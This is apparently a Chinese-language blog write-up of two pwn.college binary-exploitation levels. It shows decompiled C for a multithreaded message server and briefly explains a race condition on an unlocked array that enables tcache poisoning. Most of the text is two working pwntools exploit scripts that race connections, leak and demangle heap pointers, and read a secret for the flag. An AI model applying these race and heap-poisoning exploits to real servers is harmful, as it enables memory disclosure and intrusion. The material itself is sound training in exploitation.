---
title: "Write-ups: Software Exploitation (Exploitation Primitives) series"
published: 2025-11-21
updated: 2025-11-25
description: "Write-ups for pwn.college binary exploitation series."
image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.wizenf9io.avif"
tags: ["Pwn", "Write-ups", "FSOP"]
category: "Write-ups"
draft: false
---

# 前言

盲猜这章是 FSOP 综合利用，但是看到第一题就傻眼了。预知后事如何，请看 wp（

# Level 1

## Information

- Category: Pwn

## Description

> Create and use arbitrary read primitives to read from the .bss.

## Write-up

本来以为这章顶多就是 Heap + FSOP 综合利用，但是没想到是 Race Conditions + Heap + FSOP……没怎么做过 Race Condition 的我直接人傻了（

但是我又不想为此先去把 Race Conditions 那章做完，那咋办？忍了呗……相信自己的学习能力<s>/自信</s>

~~敲黑板，像这样详细的 wp 我大概只会写这一次，后面的题就简单说思路，不细写了。~~

首先是下面这个好像很熟悉实则不然的多线程服务器，不讲了（

不记得的去看我的[笔记](https://www.cubeyond.net/posts/cs-notes/csapp/#network-programming)复习吧～~~其实我一开始也忘差不多了（bushi~~

![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.96a6bgjii4.avif)

直接跟进到核心函数：

```c
int challenge()
{
  int result; // eax
  const char *v1; // rax
  int v2; // ebx
  char *s1_1; // rax
  int v4; // [rsp+2Ch] [rbp-424h] BYREF
  char s1[1032]; // [rsp+30h] [rbp-420h] BYREF
  unsigned __int64 v6; // [rsp+438h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  fwrite("Welcome to the message server!\n", 1u, 0x1Fu, (FILE *)__readfsqword(0xFFFFFFF8));
  fwrite("Commands: malloc/free/scanf/printf/send_flag/quit.\n", 1u, 0x33u, (FILE *)__readfsqword(0xFFFFFFF8));
  while ( 1 )
  {
    result = __isoc99_fscanf(__readfsqword(0xFFFFFFF0), "%1024s", s1);
    if ( result == -1 )
      break;
    if ( !strcmp(s1, "printf") )
    {
      result = __isoc99_fscanf(__readfsqword(0xFFFFFFF0), "%d", &v4);
      if ( result == -1 )
        return result;
      v1 = stored[v4] ? (const char *)*((_QWORD *)&messages + v4) : "NONE";
      result = fprintf((FILE *)__readfsqword(0xFFFFFFF8), "MESSAGE: %s\n", v1);
      if ( result < 0 )
        return result;
    }
    else if ( !strcmp(s1, "malloc") )
    {
      result = __isoc99_fscanf(__readfsqword(0xFFFFFFF0), "%d", &v4);
      if ( result == -1 )
        return result;
      if ( !stored[v4] )
      {
        v2 = v4;
        *((_QWORD *)&messages + v2) = malloc(0x400u);
      }
      stored[v4] = 1;
    }
    else if ( !strcmp(s1, "scanf") )
    {
      result = __isoc99_fscanf(__readfsqword(0xFFFFFFF0), "%d", &v4);
      if ( result == -1 )
        return result;
      if ( stored[v4] )
        s1_1 = (char *)*((_QWORD *)&messages + v4);
      else
        s1_1 = s1;
      __isoc99_fscanf(__readfsqword(0xFFFFFFF0), "%1024s", s1_1);
    }
    else if ( !strcmp(s1, "free") )
    {
      result = __isoc99_fscanf(__readfsqword(0xFFFFFFF0), "%d", &v4);
      if ( result == -1 )
        return result;
      if ( stored[v4] )
        free(*((void **)&messages + v4));
      stored[v4] = 0;
    }
    else if ( !strcmp(s1, "send_flag") )
    {
      fwrite("Secret: ", 1u, 8u, (FILE *)__readfsqword(0xFFFFFFF8));
      __isoc99_fscanf(__readfsqword(0xFFFFFFF0), "%1024s", s1);
      if ( (unsigned __int8)secret_correct(s1) )
      {
        fwrite("Authorized!\n", 1u, 0xCu, (FILE *)__readfsqword(0xFFFFFFF8));
        win();
      }
      else
      {
        fwrite("Not authorized!\n", 1u, 0x10u, (FILE *)__readfsqword(0xFFFFFFF8));
      }
    }
    else
    {
      result = strcmp(s1, "quit");
      if ( !result )
        return result;
      fwrite("Unrecognized choice!\n", 1u, 0x15u, (FILE *)__readfsqword(0xFFFFFFF8));
    }
  }
  return result;
}
```

咋一看还挺安全，没有溢出，没有 UAF，好像无懈可击的鸭子。

~~内心 OS: wth 第一题就这样恶心我！？那还学个屁，埋了吧（~~

好吧，稍微用心想想的话，其实还是有很大的问题的……注意，这是一个多线程服务器，允许我们创建无限的连接进行交互，但是程序在操作 `stored` 全局数组的时候并没有为其加锁，那那那，na 这不就存在一个潜在的 race condition 吗？因为 tcache 不检查 chunk metadata，所以接下来打一个 tcache poisoning 就可以任意读了。

其实我也不是完全不懂 race condition 的 xD，同样，忘记的可以看我[笔记](https://www.cubeyond.net/posts/cs-notes/csapp/#processes)。

~~OK, 讲完了/逃 bro 现在凌晨三点，实在是不想写了，各位师傅还是直接看 exp 吧去感悟吧，反正像这种菜鸟题也没人看（~~

## Exploit

```python
#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    context,
    flat,
    os,
    process,
    raw_input,
    remote,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", action="store_true")
parser.add_argument("-T", "--threads", type=int, default=None, help="thread count")
args = parser.parse_args()


FILE = "/challenge/babyprime_level1.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = elf.libc


def printf(tid, idx):
    thread[tid].sendline(f"printf {idx}".encode())


def malloc(tid, idx):
    thread[tid].sendline(f"malloc {idx}".encode())


def scanf(tid, idx, content):
    thread[tid].sendline(f"scanf {idx} {content}".encode())


def free(tid, idx):
    thread[tid].sendline(f"free {idx}".encode())


def send_flag(tid, secret):
    thread[tid].sendline(b"send_flag")
    thread[tid].sendlineafter(b"Secret: ", secret)


def quit(tid):
    thread[tid].sendline(b"quit")


def arbitrary_read(addr):
    while True:
        thread[0].send((b"malloc 0 free 0\n") * 10000)
        if os.fork() == 0:
            thread[1].send((b"scanf 0" + flat(addr) + b"\n") * 10000)
            os.kill(os.getpid(), 9)
        os.wait()

        malloc(0, 0)
        printf(0, 0)
        thread[0].recvuntil(b"MESSAGE: ")
        poisoned = int.from_bytes(thread[0].recvline().strip(), "little")

        if flat(poisoned) == flat(addr):
            break

    malloc(0, 1)
    printf(0, 1)

    thread[0].recvuntil(b"MESSAGE: ")
    return thread[0].recvline().strip()


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch():
    global target, thread

    if args.L and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.L:
        target = process(FILE)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
    else:
        target = remote(HOST, PORT, ssl=True)


def main():
    launch()

    malloc(0, 0)
    malloc(0, 1)
    free(0, 1)
    free(0, 0)
    malloc(0, 0)
    malloc(0, 1)

    printf(0, 0)
    thread[0].recvuntil(b"MESSAGE: ")
    heap = int.from_bytes(thread[0].recvline().strip(), "little")

    printf(0, 1)
    thread[0].recvuntil(b"MESSAGE: ")
    pos = int.from_bytes(thread[0].recvline().strip(), "little")
    heap = demangle(heap, pos)

    thread[0].success(f"pos: {hex(pos)}")
    thread[0].success(f"heap: {hex(heap)}")

    malloc(0, 0)
    malloc(0, 1)
    free(0, 1)
    free(0, 0)

    raw_input("DEBUG")
    secret = 0x4054C0
    secret = arbitrary_read(mangle(pos - 1, secret))

    send_flag(0, secret)
    quit(0)
    quit(1)

    thread[0].interactive()


if __name__ == "__main__":
    main()
```

# Level 2

## Information

- Category: Pwn

## Description

> Create and use arbitrary read primitives to read from a thread's heap.

## Write-up

太简单不讲。

## Exploit

```python
#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    context,
    flat,
    os,
    process,
    raw_input,
    remote,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", action="store_true")
parser.add_argument("-T", "--threads", type=int, default=None, help="thread count")
args = parser.parse_args()


FILE = "/challenge/babyprime_level2.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = elf.libc


def printf(tid, idx):
    thread[tid].sendline(f"printf {idx}".encode())


def malloc(tid, idx):
    thread[tid].sendline(f"malloc {idx}".encode())


def scanf(tid, idx, content):
    thread[tid].sendline(f"scanf {idx} {content}".encode())


def free(tid, idx):
    thread[tid].sendline(f"free {idx}".encode())


def send_flag(tid, secret):
    thread[tid].sendline(b"send_flag")
    thread[tid].sendlineafter(b"Secret: ", secret)


def quit(tid):
    thread[tid].sendline(b"quit")


def arbitrary_read(addr):
    while True:
        thread[0].send((b"malloc 0 free 0\n") * 10000)
        if os.fork() == 0:
            thread[1].send((b"scanf 0" + flat(addr) + b"\n") * 10000)
            os.kill(os.getpid(), 9)
        os.wait()

        malloc(0, 0)
        printf(0, 0)
        thread[0].recvuntil(b"MESSAGE: ")
        poisoned = int.from_bytes(thread[0].recvline().strip(), "little")

        if flat(poisoned) == flat(addr):
            break

    malloc(0, 1)
    printf(0, 1)

    thread[0].recvuntil(b"MESSAGE: ")
    return thread[0].recvline().strip()


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch():
    global target, thread

    if args.L and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.L:
        target = process(FILE)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
    else:
        target = remote(HOST, PORT, ssl=True)


def main():
    launch()

    malloc(0, 0)
    malloc(0, 1)
    free(0, 1)
    free(0, 0)
    malloc(0, 0)
    malloc(0, 1)

    printf(0, 0)
    thread[0].recvuntil(b"MESSAGE: ")
    heap = int.from_bytes(thread[0].recvline().strip(), "little")

    printf(0, 1)
    thread[0].recvuntil(b"MESSAGE: ")
    pos = int.from_bytes(thread[0].recvline().strip(), "little")
    heap = demangle(heap, pos)

    thread[0].success(f"pos: {hex(pos)}")
    thread[0].success(f"heap: {hex(heap)}")

    malloc(0, 0)
    malloc(0, 1)
    free(0, 1)
    free(0, 0)

    raw_input("DEBUG")
    secret = heap - 0x431
    secret = arbitrary_read(mangle(pos - 1, secret))
    thread[0].success(secret)

    send_flag(0, secret)
    quit(0)
    quit(1)

    thread[0].interactive()


if __name__ == "__main__":
    main()
```
